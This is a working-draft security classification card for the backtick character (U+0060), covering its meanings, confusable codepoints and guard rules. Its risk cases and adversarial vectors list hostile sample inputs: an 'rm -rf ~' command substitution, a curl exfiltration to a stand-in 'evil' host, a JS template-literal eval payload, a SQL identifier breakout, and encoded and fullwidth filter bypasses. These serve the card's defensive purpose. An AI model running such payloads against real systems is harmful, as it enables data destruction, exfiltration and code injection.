PRIVATE AUTHORED PROJECT / COMMERCIAL USE PROHIBITED

DOCUMENT_ID: SIGN_CORE_CARD_GRAVE_ACCENT_U0060_GEN3_v0_3_EN
DOCUMENT_TYPE: SIGN_CORE_CARD
TEMPLATE_LINE: GEN3_v0_3
DOCUMENT_STATUS: WORKING_DRAFT
STATUS: WORKING_DRAFT / NOT_LOCKED / NOT_RUNTIME / NOT_VALIDATOR / NOT_PRODUCTION / NOT_CONVEYOR_RUN
SOURCE_TEMPLATE: SIGN_CORE_CARD_TEMPLATE_GEN3_v0_3_EN
BASED_ON_RULESET: SIGN_CORE_CARD_CONVEYOR_RULES_GEN3_v0_3_EN
TRANSLATION_NOTE: English mirror of SIGN_CORE_CARD_GRAVE_ACCENT_U0060_GEN3_v0_3_RU (authoritative). Codepoints, field names and formulas identical. DRAFT for our work (Vakhter); conveyor is a separate project.

============================================================
0. UNIVERSALITY
============================================================
BOUND_TO_SPECIFIC_SIGN: YES
AFTER_USE_RESIDUE: FORBIDDEN
SIGN_DATA_IS_SESSION_ONLY: YES

============================================================
1. COMMON_CONVEYOR_DISCIPLINE
============================================================
CONVEYOR_DISCIPLINE_VERSION: v0_3
RUN_CARD_REQUIRED_BEFORE_LOCK: YES
LOCKED_WORKING_CORE_SELF_ASSIGNMENT: FORBIDDEN
MODEL_FAMILY_DIVERSITY_REQUIRED: YES
ADVERSARIAL_EVIDENCE_REQUIRED: YES
MUTATION_CHECK_REQUIRED: YES
LIMITATION_STATEMENT_REQUIRED: YES
AFTER_RUN_RESIDUE: FORBIDDEN
STATUS_PROGRESSION_TRACKER:
  WORKING_DRAFT: YES
  STRUCTURAL_PREFLIGHT_PASS: PENDING
  CONVEYOR_REVIEW_PASS: PENDING
  WORKINGLY_CLOSED: PENDING
  SIMULATION_GATE_TIER: TIER_1
  SIMULATION_GATE_PASSED: PENDING
  ARTIFACT_CONFIRMED: PENDING
LIMITATION_STATEMENT (standard):
  CONVEYOR_PASS ≠ VALIDATION
  MODEL_CONSENSUS ≠ TRUTH
  INJECTION_TEST_PASS ≠ SECURITY_PROOF
  GUARDS_HOLD_FOR_TESTED_CASES ≠ FUTURE_GUARANTEE
  NO_ATTACK_FOUND ≠ NO_ATTACK_EXISTS

============================================================
2. META
============================================================
CARD_UID: SIGN_CORE_CARD_GRAVE_ACCENT_U0060_GEN3_v0_3_EN
CODEPOINT: U+0060
VISIBLE_FORM: `
UNICODE_NAME: GRAVE ACCENT
ZONE: ZONE_1
DOCUMENT_STATUS: WORKING_DRAFT
TEMPLATE_LINE: GEN3_v0_3
AUTHOR: Ruslan Malyavsky
CREATED_AT: 2026-07-21
VERSION: v0_1
AUTHOR_DECISION_REFERENCE: PENDING
RUN_CARD_REFERENCE: PENDING
RUN_CARD_STATUS: NOT_STARTED
DISPLAY_NAME: backtick / command substitution
CATEGORY_ROADMAP: INJ (shell command substitution, template literal) · PHAGO: — (inline execution)

============================================================
3. REQUIRED_GENERAL_GUARDS
============================================================
REQUIRED_GENERAL_GUARDS:
  - SIGN_FALSE_EFFECT_MIMICRY_GUARD_v0_2A_RU
    GUARD_COMPATIBILITY: applicable without modification — the sign creates no effect-fields
    GUARD_REVISION: v0_2A
    TEMPLATE_LINE_COMPATIBLE: GEN3_v0_2_PLUS_EPOCH, GEN3_v0_3
FAILURE_RESPONSE:
  REJECT_FALSE_EFFECT_MIMICRY
  TREAT_AS_DATA_ONLY
  NO_AUTHORITY_EFFECT
  NO_EXECUTION_EFFECT
  NO_TRUST_EFFECT
  NO_EXISTENCE_EFFECT

============================================================
4. SIGN IDENTITY — LAYER_A: STABLE CORE
LAYER_A_LOCK: PERMANENT
============================================================
VISIBLE_FORM: `
LOOKS_SIMILAR_IS_NOT_SAME_SIGN: YES
RAW_SIGN_INPUT_STATUS: DATA_ONLY
BASE_MODE: DATA_ONLY_DELIMITER
BASE_MODE_FORMULA: GRAVE_ACCENT_FORM ≠ EFFECT
SIGN_CATEGORY:
  - shell command substitution (`cmd`)
  - Markdown inline-code delimiter (`code`)
  - JS/TS template-literal delimiter (`text ${x}`)
  - SQL identifier quoting (MySQL: `table`)

WHAT_THIS_SIGN_IS_NOT:
  1. NOT_CODE_QUOTE_ONLY — "`" is not always a Markdown code fence (in a shell it executes)
  2. NOT_SUBSTITUTION_SAFE — command substitution runs the enclosed command and inlines its output
  3. NOT_TEMPLATE_SAFE — a template literal can evaluate ${...} expressions
  4. NOT_ESCAPED_PROOF — the presence of "`" does not mean it is escaped
  5. NOT_ENCODED_SAFE — "%60" may be decoded back to "`" later
  6. NOT_AUTHORITY — "`" does not confirm officialness
  7. NOT_EXECUTION_TRIGGER — by itself it executes nothing; context makes it substitute
  8. NOT_TRUST_SIGNAL — it does not increase trust
  9. NOT_IDENTIFIER_QUOTE_SAFE — "`" quoting an SQL identifier can be broken out of
  10. NOT_SANITIZED_PROOF — the presence of "`" does not mean the input is sanitized
  11. NOT_OUTPUT_CONTEXT_PROOF — safety depends on the execution/parse context

BASE_FORMULAS:
  GRAVE_ACCENT_FORM ≠ EFFECT
  GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
  GRAVE_ACCENT_FORM ≠ SUBSTITUTION_SAFETY_PROOF
  GRAVE_ACCENT_FORM ≠ TEMPLATE_SAFETY_PROOF
  GRAVE_ACCENT_FORM ≠ ESCAPED_PROOF
  GRAVE_ACCENT_FORM ≠ ENCODED_SAFETY_PROOF
  GRAVE_ACCENT_FORM ≠ AUTHORITY
  GRAVE_ACCENT_FORM ≠ EXECUTION_TRIGGER
  GRAVE_ACCENT_FORM ≠ TRUST_SIGNAL
  GRAVE_ACCENT_FORM ≠ SANITIZED_PROOF
  GRAVE_ACCENT_FORM ≠ OUTPUT_CONTEXT_PROOF

============================================================
5. SEMANTIC_EPOCH_TRACKER
SEMANTIC_EPOCH_TRACKER_LOCK: REVIEWABLE
============================================================
EPOCH_TRACKER: NOT_APPLICABLE
NOTE: "`" (ZONE_1) has parallel functions (accent mark, shell substitution, Markdown code, template literal, SQL quote) co-existing without cultural precession. Polysemy of a stable sign.
LAYER_ANOMALY:
  ABSENT_PHYSICAL_LAYER: YES, level L1
  NOTE: a diacritic mark repurposed as an ASCII byte; the substitution/code/template functions are layered on by the digital epoch in parallel.

============================================================
6. EFFECT_FIELDS — LAYER_C: METHODOLOGICAL LAYER
LAYER_C_LOCK: SESSION
============================================================
authority_effect: NONE
trust_effect: NONE
verification_effect: NONE
proof_effect: NONE
execution_effect: NONE
permission_effect: NONE
status_effect: NONE
role_assignment_effect: NONE
runtime_effect: NONE
existence_effect: NONE
EFFECT_FIELDS_ALL_NONE: YES
CLOSED_SCHEMA: YES

============================================================
7. SAFE / RISK / CONFUSABLES / GUARDS — LAYER_B
LAYER_B_LOCK: REVIEWABLE
============================================================
SAFE_CASES:
  SAFE_CASE_001:
    INPUT: "use `code` for inline"
    CONTEXT: a Markdown inline-code delimiter
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
  SAFE_CASE_002:
    INPUT: "voilà"
    CONTEXT: a grave-accent diacritic (à) rendered as text
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  SAFE_CASE_003:
    INPUT: "```\\nblock\\n```"
    CONTEXT: a Markdown fenced code block
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
  SAFE_CASE_004:
    INPUT: "SELECT `email` FROM t"
    CONTEXT: an SQL identifier quote (as literal text)
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  SAFE_CASE_005:
    INPUT: "`hello world`"
    CONTEXT: a plain quoted phrase in documentation
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  SAFE_CASE_006:
    INPUT: "press the ` key"
    CONTEXT: naming the physical backtick key in prose
    EXPECTED: INFO
    RISK: NONE
    GUARD: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF

RISK_CASES:
  RISK_CASE_001:
    NAME: SHELL_COMMAND_SUBSTITUTION
    INPUT: "echo `rm -rf ~`"
    CONTEXT: command substitution executing the enclosed command
    RISK: CRITICAL
    ATTACK: the shell runs the command inside backticks and inlines its output
    GUARD: GRAVE_ACCENT_FORM ≠ SUBSTITUTION_SAFETY_PROOF
  RISK_CASE_002:
    NAME: NESTED_SUBSTITUTION_EXFIL
    INPUT: "`curl evil/$(whoami)`"
    CONTEXT: substitution combined with data exfil
    RISK: CRITICAL
    ATTACK: the backtick command runs and leaks the result to an attacker host
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT
  RISK_CASE_003:
    NAME: TEMPLATE_LITERAL_EVAL
    INPUT: "`${constructor.constructor('alert(1)')()}`"
    CONTEXT: a JS template literal evaluating an injected expression
    RISK: HIGH
    ATTACK: ${...} inside a backtick template evaluates attacker code
    GUARD: GRAVE_ACCENT_FORM ≠ TEMPLATE_SAFETY_PROOF
  RISK_CASE_004:
    NAME: SQL_IDENTIFIER_BREAKOUT
    INPUT: "col` FROM users; -- "
    CONTEXT: breaking out of a MySQL backtick-quoted identifier
    RISK: HIGH
    ATTACK: "`" closes the identifier quote and lets an injected clause run
    GUARD: GRAVE_ACCENT_FORM ≠ IDENTIFIER_QUOTE_SAFE
  RISK_CASE_005:
    NAME: ENCODED_BACKTICK_BYPASS
    INPUT: "cmd%60whoami%60 (with a later decode)"
    CONTEXT: an encoded "`" decoded back before execution
    RISK: HIGH
    ATTACK: %60 decodes to "`" AFTER the check → command substitution
    GUARD: GRAVE_ACCENT_FORM ≠ ENCODED_SAFETY_PROOF
  RISK_CASE_006:
    NAME: FULLWIDTH_BACKTICK_BYPASS
    INPUT: "cmd｀whoami｀ (fullwidth ｀ U+FF40)"
    CONTEXT: a look-alike to bypass a "`" filter
    RISK: MEDIUM
    ATTACK: a filter looks for ASCII "`", a normalizer may fold ｀ to "`"
    GUARD: GRAVE_ACCENT_FORM ≠ EFFECT

CONFUSABLES:
  CONFUSABLE_001:
    VISIBLE_FORM: ｀
    CODEPOINT: U+FF40
    NAME: FULLWIDTH GRAVE ACCENT
    RISK: HIGH
    RULE: FULLWIDTH_GRAVE_ACCENT ≠ GRAVE_ACCENT (bypasses a filter looking for ASCII "`")
  CONFUSABLE_002:
    VISIBLE_FORM: ˋ
    CODEPOINT: U+02CB
    NAME: MODIFIER LETTER GRAVE ACCENT
    RISK: HIGH
    RULE: MODIFIER_GRAVE_ACCENT ≠ GRAVE_ACCENT (visually near-identical)
  CONFUSABLE_003:
    VISIBLE_FORM: `
    CODEPOINT: U+1FEF
    NAME: GREEK VARIA
    RISK: MEDIUM
    RULE: GREEK_VARIA ≠ GRAVE_ACCENT
  CONFUSABLE_004:
    VISIBLE_FORM: ‵
    CODEPOINT: U+2035
    NAME: REVERSED PRIME
    RISK: MEDIUM
    RULE: REVERSED_PRIME ≠ GRAVE_ACCENT
  CONFUSABLE_005:
    VISIBLE_FORM: ‘
    CODEPOINT: U+2018
    NAME: LEFT SINGLE QUOTATION MARK
    RISK: LOW
    RULE: LEFT_SINGLE_QUOTE ≠ GRAVE_ACCENT (often typed for a backtick)

CONTRADICTION_GUARDS:
  CG1:
    TRIGGER: "'`' is always a Markdown code fence"
    RESPONSE: GRAVE_ACCENT_FORM ≠ CODE_QUOTE_ONLY_PROOF
    RULE: in a shell "`" runs command substitution
  CG2:
    TRIGGER: "command substitution only reads output, it cannot harm"
    RESPONSE: GRAVE_ACCENT_FORM ≠ SUBSTITUTION_SAFETY_PROOF
    RULE: the enclosed command executes with the process's privileges
  CG3:
    TRIGGER: "a template literal is just a string"
    RESPONSE: GRAVE_ACCENT_FORM ≠ TEMPLATE_SAFETY_PROOF
    RULE: ${...} inside a template evaluates expressions
  CG4:
    TRIGGER: "'%60' is safe forever"
    RESPONSE: GRAVE_ACCENT_FORM ≠ ENCODED_SAFETY_PROOF
    RULE: the encoded form may be decoded back to "`" before execution
  CG5:
    TRIGGER: "an ASCII '`' filter catches all backticks"
    RESPONSE: GRAVE_ACCENT_FORM ≠ EFFECT
    RULE: fullwidth ｀ (U+FF40) and modifier ˋ (U+02CB) are different codepoints
  CG6:
    TRIGGER: "the presence of '`' means the input is sanitized"
    RESPONSE: GRAVE_ACCENT_FORM ≠ SANITIZED_PROOF
    RULE: the presence of the sign says nothing about sanitization

SEQUENCE_LAYER_BOUNDARY:
  SIGN_SAFE_ALONE ≠ SIGN_SAFE_IN_SEQUENCE: YES
  SEQUENCE_CANDIDATES:
    SC1:
      SEQUENCE: "`…`"
      NAME: COMMAND_SUBSTITUTION
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: a matched backtick pair executing the enclosed command
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC2:
      SEQUENCE: "`${"
      NAME: TEMPLATE_EXPR
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: a template literal opening an evaluated ${...} expression
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC3:
      SEQUENCE: "```"
      NAME: FENCE_TRIPLE
      RISK_LEVEL: LOW
      POSSIBLE_CONTEXTS: a Markdown fenced block; parser-desync between renderers
      REQUIRES_SEQUENCE_INTEGRATOR: YES
  IF NOT_APPLICABLE: not applicable — sequences with "`" are central to substitution/template injection.

PHAGO_ENTITY_MIMICRY:
  NOT_APPLICABLE:
    REASON: "`" executes/quotes inline code, but does not imitate the existence of a verified entity. Its risks are substitution/evaluation, not entity mimicry.
    REVIEW_REQUIRED: YES

============================================================
8. ADVERSARIAL_COVERAGE — RUN_CARD SEED
============================================================
MIN_TOTAL_VECTORS: 10 (5 categories A-E, CATEGORY_F NOT_APPLICABLE for ZONE_1)
CATEGORY_A: FORM_MANIPULATION (2)
  A1: substitution of ASCII "`" with fullwidth ｀ (U+FF40) to bypass a filter
  A2: substitution with modifier ˋ (U+02CB)
CATEGORY_B: CONTEXT_INJECTION (2)
  B1: shell command substitution echo `rm -rf ~`
  B2: SQL identifier breakout col` FROM users; --
CATEGORY_C: SEQUENCE_MANIPULATION (2)
  C1: "`…`" (SC1) — command substitution pair
  C2: "`${" (SC2) — template expression open
CATEGORY_D: SEMANTIC_MIMICRY (2)
  D1: "`" presented as a harmless Markdown code quote inside a command field
  D2: "%60" as "safe" encoded text with a later decode
CATEGORY_E: PHAGO_ENTITY_MIMICRY (2)
  E1: N/A — the sign is not a PHAGO carrier; vector: substitution into an OS-command template
  E2: N/A — vector: template-literal eval in a rendered JS string
CATEGORY_F: SEMANTIC_LAYER_MANIPULATION
  NOT_APPLICABLE
  REASON: ZONE_1, the sign has no dormant/active epochs.
ACTUAL_TOTAL_VECTORS: 10
COVERAGE_STATUS: SUFFICIENT (10 ≥ 10)

============================================================
9. MUTATION_CHECK
============================================================
MUTATION_01:
  CLAIM: "`" is always a Markdown code fence
  EXPECTED: FAIL_CODE_QUOTE_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_02:
  CLAIM: command substitution cannot cause harm
  EXPECTED: FAIL_SUBSTITUTION_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_03:
  CLAIM: a template literal is just a string
  EXPECTED: FAIL_TEMPLATE_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_04:
  CLAIM: "%60" is safe forever
  EXPECTED: FAIL_ENCODED_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_05:
  CLAIM: an ASCII "`" filter catches all backtick look-alikes
  EXPECTED: FAIL_CONFUSABLE_COVERAGE_MIMICRY
  RESULT: FAIL
MUTATION_06:
  CLAIM: the presence of "`" proves the input was sanitized
  EXPECTED: FAIL_SANITIZED_MIMICRY
  RESULT: FAIL

============================================================
10. KNOWN_OPEN_QUESTIONS
============================================================
OQ1:
  QUESTION: how to neutralize "`" per context (shell/JS-template/MySQL) without false positives on Markdown/diacritics/prose?
  STATUS: CLOSED_AS_DELEGATED_TO_INTEGRATOR (argument-vector exec + avoiding template-literal eval of untrusted input + parameterized queries is an integrator/runtime concern)
  BLOCKS_WORKINGLY_CLOSED: NO
  NOTE: the card fixes the rule "the safety of '`' is decided by the execution/parse context".
ALL_OPEN_QUESTIONS_CLOSED: NO (delegated, non-blocking)

============================================================
11. PATCH_HISTORY
============================================================
PATCH_HISTORY:
  v0_1_PATCH_01: initial creation (Ruslan Malyavsky, 2026-07-21) — draft from the GEN3_v0_3 template (Vakhter); not conveyor-run.
PATCHES_APPLIED: 1
PATCHES_VERIFIED: 0/1

============================================================
12. LIMITATION_STATEMENT
============================================================
LIMITATION_STATEMENT:
  THIS_CARD IS A WORKING_DRAFT ARTIFACT (until ARTIFACT_CONFIRMED)
  NOT A FINAL_STANDARD
  NOT A PARSER
  NOT A RUNTIME
  NOT A SECURITY_CERTIFICATE
  NOT_CONVEYOR_RUN (draft for our work; conveyor is a separate project)
  CONVEYOR_PASS ≠ VALIDATION
  RUN_CARD_RESULT ≠ FINAL_STATUS
  WORKINGLY_CLOSED ≠ ARTIFACT_CONFIRMED

============================================================
13. INTEGRATION_INTERFACE_STATUS
============================================================
INTEGRATION_INTERFACE_STATUS:
  STATUS: READY_PENDING_CONCRETE_INTEGRATOR
  ATTACHED_INTEGRATOR_UID: NONE_CURRENTLY_ATTACHED
  ACTIVE_MODULES_COUNT: 0
  RUNTIME_ATTACHMENT: NONE
  PERMANENT_BINDING: NO
  SESSION_ONLY_BINDING: YES
  AFTER_RUN_RESIDUE: FORBIDDEN

============================================================
END_OF_DOCUMENT
